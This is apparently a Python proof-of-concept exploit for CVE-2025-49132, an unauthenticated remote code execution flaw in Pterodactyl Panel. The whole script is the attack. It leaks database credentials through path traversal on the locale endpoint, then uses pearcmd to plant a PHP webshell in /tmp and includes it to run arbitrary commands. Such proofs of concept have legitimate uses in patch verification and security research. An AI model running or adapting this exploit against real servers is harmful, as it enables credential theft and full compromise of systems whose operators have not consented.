#!/usr/bin/env python3
import socket
import argparse
import random
import string
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_raw_request(host, port, path):
    request = f'''GET {path} HTTP/1.1\r
Host: {host}:{port}\r
Connection: close\r
\r
'''.encode()
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))
    sock.sendall(request)
    
    response = b''
    while True:
        try:
            data = sock.recv(4096)
            if not data:
                break
            response += data
        except:
            break
    
    sock.close()
    return response.decode('utf-8', errors='ignore')

def leak_database_credentials(host, port):
    print("[*] Stage 1: Leaking database credentials...")
    path = "/locales/locale.json?locale=../../../app&namespace=config/database"
    response = send_raw_request(host, port, path)
    
    if '"password"' in response and '"username"' in response:
        print("[+] Database credentials leaked successfully!")
        import json
        try:
            body_start = response.find('{')
            body = response[body_start:]
            data = json.loads(body)
            db_config = data.get("../../../app", {}).get("config/database", {})
            mysql = db_config.get("connections", {}).get("mysql", {})
            return {
                "host": mysql.get("host", "N/A"),
                "port": mysql.get("port", "N/A"),
                "database": mysql.get("database", "N/A"),
                "username": mysql.get("username", "N/A"),
                "password": mysql.get("password", "N/A")
            }
        except:
            pass
    return None

def create_webshell(host, port, command):
    print(f"[*] Stage 2: Creating webshell with command: {command}")
    shell_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    shell_path = f"/tmp/{shell_name}.php"
    
    path = f"/locales/locale.json?+config-create+/&locale=../../../usr/local/lib/php&namespace=pearcmd&/<?=`{command}`?>+{shell_path}"
    response = send_raw_request(host, port, path)
    
    if 'Successfully' in response:
        print(f"[+] Webshell created at {shell_path}")
        return shell_name
    else:
        print("[-] Failed to create webshell")
        return None

def execute_webshell(host, port, shell_name):
    print("[*] Stage 3: Executing webshell...")
    path = f"/locales/locale.json?locale=../../../../tmp&namespace={shell_name}"
    response = send_raw_request(host, port, path)
    return response

def extract_command_output(response):
    lines = response.split('\n')
    for line in lines:
        if 'uid=' in line or 'root' in line:
            start = line.find('uid=') if 'uid=' in line else 0
            return line[start:].strip()
    return None

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-49132 - Pterodactyl Panel RCE PoC")
    parser.add_argument("target", help="Target URL (e.g., http://localhost:8080)")
    parser.add_argument("-c", "--command", default="id", help="Command to execute (default: id)")
    args = parser.parse_args()
    
    target = args.target.rstrip('/')
    if '://' in target:
        target = target.split('://')[1]
    
    if ':' in target:
        host, port = target.split(':')
        port = int(port)
    else:
        host = target
        port = 80
    
    print("=" * 60)
    print("CVE-2025-49132 - Pterodactyl Panel Unauthenticated RCE")
    print("Affected versions: < 1.11.11")
    print("=" * 60)
    print(f"[*] Target: {host}:{port}")
    print(f"[*] Command: {args.command}")
    print()
    
    creds = leak_database_credentials(host, port)
    if creds:
        print(f"    Host: {creds['host']}")
        print(f"    Port: {creds['port']}")
        print(f"    Database: {creds['database']}")
        print(f"    Username: {creds['username']}")
        print(f"    Password: {creds['password']}")
        print()
    
    shell_name = create_webshell(host, port, args.command)
    if not shell_name:
        print("[-] Exploit failed at webshell creation stage")
        return 1
    
    response = execute_webshell(host, port, shell_name)
    output = extract_command_output(response)
    
    print()
    print("=" * 60)
    if output or 'uid=' in response:
        print("[+] RCE SUCCESSFUL!")
        print("=" * 60)
        if output:
            print(f"[+] Command output: {output}")
        else:
            if 'uid=' in response:
                start = response.find('uid=')
                end = response.find('\n', start)
                print(f"[+] Command output: {response[start:end]}")
        print("=" * 60)
        return 0
    else:
        print("[-] RCE may have failed or command produced no output")
        print("[-] Check the response for potential output")
        print("=" * 60)
        return 1

if __name__ == "__main__":
    exit(main())
